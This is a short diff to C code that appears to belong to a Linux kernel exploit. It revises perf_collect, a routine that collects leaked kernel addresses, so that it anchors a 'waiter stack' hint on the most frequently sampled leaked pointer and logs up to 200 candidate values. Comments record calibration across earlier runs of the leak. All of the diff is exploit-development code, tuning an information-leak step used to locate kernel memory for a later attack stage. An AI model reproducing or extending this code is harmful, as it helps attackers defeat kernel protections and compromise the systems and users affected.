@@ -1862,10 +1862,24 @@ static int perf_collect(int pid, struct perf_leak *out) {
       if (vm_page[u] && (best < 0 || vm_pn[u] > vm_pn[best]))
         best = u;
     if (best >= 0 && vm_pn[best] >= 8) {
-      g_waiter_stack_hint = (uintptr_t)vm_top[best];
-      pr_info("waiter stack cluster: page=%llx top=%llx n=%d\n",
+      /* COUNT-BASED ANCHOR (jc38 post-mortem): vm_top (max low-nibble)
+       * lands on DIFFERENT slots run-to-run (c58 vs e40) — the -120
+       * calibration didn't transfer. The stable anchor = the HIGHEST-
+       * COUNT value on the cluster page: the fdset in-buffer pointer
+       * dominates samples (652 vs 317 next in the jc37 measurement).
+       * ghost = that value; PSELECT_GHOST_DELTA defaults 0. */
+      uint64_t hotv = vm_top[best];
+      int hotc = -1;
+      for (int gu = 0; gu < gv_n; gu++)
+        if ((gv_val[gu] & ~0xfffull) == vm_page[best] &&
+            gv_cnt[gu] > hotc) {
+          hotc = gv_cnt[gu];
+          hotv = gv_val[gu];
+        }
+      g_waiter_stack_hint = (uintptr_t)hotv;
+      pr_info("waiter stack cluster: page=%llx hot=%llx (x%d) n=%d\n",
               (unsigned long long)vm_page[best],
-              (unsigned long long)vm_top[best], vm_pn[best]);
+              (unsigned long long)hotv, hotc, vm_pn[best]);
     }
     /* GHOST MEASURE: dump EVERY vmap cluster page (page, top, count) so
      * ghost candidates come from data — the fdset buffer address is among
@@ -1876,7 +1890,7 @@ static int perf_collect(int pid, struct perf_leak *out) {
           pr_info("GMEAS page=%llx top=%llx n=%d\n",
                   (unsigned long long)vm_page[u],
                   (unsigned long long)vm_top[u], vm_pn[u]);
-      for (int rank = 0; rank < 24 && rank < gv_n; rank++) {
+      for (int rank = 0; rank < 200 && rank < gv_n; rank++) {
         int gb = -1;
         for (int gu = 0; gu < gv_n; gu++)
           if (gv_cnt[gu] > 0 && (gb < 0 || gv_cnt[gu] > gv_cnt[gb]))
